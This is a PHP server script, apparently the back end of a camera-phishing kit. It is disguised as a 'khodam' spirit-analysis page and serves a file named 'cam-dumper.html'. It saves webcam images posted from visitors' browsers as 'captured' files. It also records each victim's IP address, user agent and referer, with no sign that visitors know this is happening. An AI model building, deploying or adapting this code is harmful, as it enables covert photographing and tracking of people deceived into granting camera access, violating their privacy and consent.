<?php
date_default_timezone_set('Asia/Jakarta');
function write_log($message) {
    $log_file = 'Log.log';
    $timestamp = date('Y-m-d H:i:s');
    $log_message = "[$timestamp] $message\n";
    file_put_contents($log_file, $log_message, FILE_APPEND);
}
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['image']) && !empty($_POST['image'])) {
        $image_data = $_POST['image'];
        $image_data = str_replace('data:image/png;base64,', '', $image_data);
        $image_data = str_replace(' ', '+', $image_data);
        $image_data = base64_decode($image_data);        
        if ($image_data !== false) {
            $filename = 'captured_' . time() . '_' . rand(1000, 9999) . '.png';
            $filepath = 'captured_files/new/' . $filename;
            if (file_put_contents($filepath, $image_data)) {
                write_log("Gambar disimpan: $filename");
                echo "SUCCESS: Gambar berhasil ditangkap";
            } else {
                write_log("ERROR: Gagal menyimpan gambar");
                echo "ERROR: Gagal menyimpan gambar";
            }
        } else {
            write_log("ERROR: Data gambar tidak valid");
            echo "ERROR: Data gambar tidak valid";
        }
    }
    elseif (isset($_POST['manual_scan'])) {
        $filename = 'manual_scan_' . time() . '_' . rand(1000, 9999) . '.txt';
        $filepath = 'captured_files/new/' . $filename;        
        $data = "=== HASIL SCAN MANUAL ===\n";
        $data .= "Tanggal: " . date('Y-m-d H:i:s') . "\n";
        $data .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
        $data .= "User Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
        $data .= "Hasil: Analisis khodam manual berhasil\n";        
        if (file_put_contents($filepath, $data)) {
            write_log("Scan manual disimpan: $filename");
            echo "SUCCESS: Scan manual berhasil";
        } else {
            write_log("ERROR: Gagal menyimpan scan manual");
            echo "ERROR: Gagal menyimpan scan manual";
        }
    }
    elseif (isset($_POST['save_result'])) {
        $khodam = isset($_POST['khodam']) ? $_POST['khodam'] : 'Unknown';
        $energy = isset($_POST['energy']) ? $_POST['energy'] : '0';
        $compatibility = isset($_POST['compatibility']) ? $_POST['compatibility'] : '0';     
        $filename = 'result_' . time() . '_' . rand(1000, 9999) . '.txt';
        $filepath = 'captured_files/new/' . $filename;    
        $data = "=== HASIL ANALISIS KHODAM ===\n";
        $data .= "Tanggal: " . date('Y-m-d H:i:s') . "\n";
        $data .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
        $data .= "Khodam: " . $khodam . "\n";
        $data .= "Energi: " . $energy . "%\n";
        $data .= "Kecocokan: " . $compatibility . "%\n";
        $data .= "User Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n";        
        if (file_put_contents($filepath, $data)) {
            write_log("Hasil analisis disimpan: $filename");
            echo "SUCCESS: Hasil analisis berhasil disimpan";
        } else {
            write_log("ERROR: Gagal menyimpan hasil analisis");
            echo "ERROR: Gagal menyimpan hasil analisis";
        }
    }
    elseif (isset($_POST['getUserMedia'])) {
        write_log("DEBUG: getUserMedia dipanggil");
        echo "DEBUG: getUserMedia tersedia";
    }
    exit;
}
if (isset($_GET['ip'])) {
    $ip = $_GET['ip'];
    $filename = 'ip_' . time() . '.txt';
    $filepath = 'captured_files/new/' . $filename;    
    $data = "IP Address: $ip\n";
    $data .= "Tanggal: " . date('Y-m-d H:i:s') . "\n";
    $data .= "User Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
    $data .= "Referer: " . (isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct') . "\n";  
    file_put_contents($filepath, $data);
    file_put_contents('ip.txt', $data); 
    write_log("IP ditangkap: $ip");
    header('Location: index2.html');
    exit;
}
readfile('cam-dumper.html');
?>